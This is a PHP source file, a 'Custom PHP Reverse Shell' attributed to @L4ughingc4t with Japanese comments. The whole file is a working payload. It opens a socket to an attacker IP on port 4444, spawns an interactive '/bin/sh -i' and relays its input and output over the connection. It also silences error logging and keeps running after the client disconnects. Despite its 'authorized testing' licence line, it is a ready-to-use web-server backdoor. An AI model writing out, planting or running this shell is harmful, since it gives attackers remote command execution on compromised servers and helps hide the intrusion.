<?php
/**
 * Custom PHP Reverse Shell
 * Author: @L4ughingc4t
 * Based on ideas from pentestmonkey.net
 * License: For educational or authorized testing purposes only
 */

set_time_limit(0);                     // タイムアウト防止
ob_implicit_flush(true);              // 出力を即時に反映
ignore_user_abort(true);              // クライアント切断でも動作継続

$ip = 'xxx.xxx.xxx.xxx';              // ← 攻撃者側IP（適宜変更）
$port = 4444;                         // ← 待ち受けポート（適宜変更）
$shell = '/bin/sh -i';               // 使用するシェル（bash不要）
$errlog = '/dev/null';               // エラーログを抑制

// 標準出力とエラー出力を/dev/nullに
ini_set('display_errors', '0');
ini_set('log_errors', '0');
ini_set('error_log', $errlog);

// ソケット作成
$socket = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$socket) {
    exit("Connection failed: $errstr ($errno)\n");
}

// バナー送信
fwrite($socket, "[*] Connected to PHP reverse shell\n");

// ストリームを開いて双方向通信
$descriptorspec = [
    0 => ["pipe", "r"],  // stdin
    1 => ["pipe", "w"],  // stdout
    2 => ["pipe", "w"]   // stderr
];

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    fwrite($socket, "[!] Failed to start shell process.\n");
    fclose($socket);
    exit;
}

// 非ブロッキングモード設定
stream_set_blocking($pipes[1], false);
stream_set_blocking($pipes[2], false);
stream_set_blocking($socket, false);

// 通信ループ
while (true) {
    if (feof($socket)) break;

    // socket → stdin
    $input = fread($socket, 2048);
    if ($input !== false) {
        fwrite($pipes[0], $input);
    }

    // stdout → socket
    $output = fread($pipes[1], 2048);
    if ($output !== false) {
        fwrite($socket, $output);
    }

    // stderr → socket
    $error = fread($pipes[2], 2048);
    if ($error !== false) {
        fwrite($socket, $error);
    }

    usleep(100000); // 0.1秒待機（CPU負荷軽減）
}

// 終了処理
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
fclose($socket);
?>
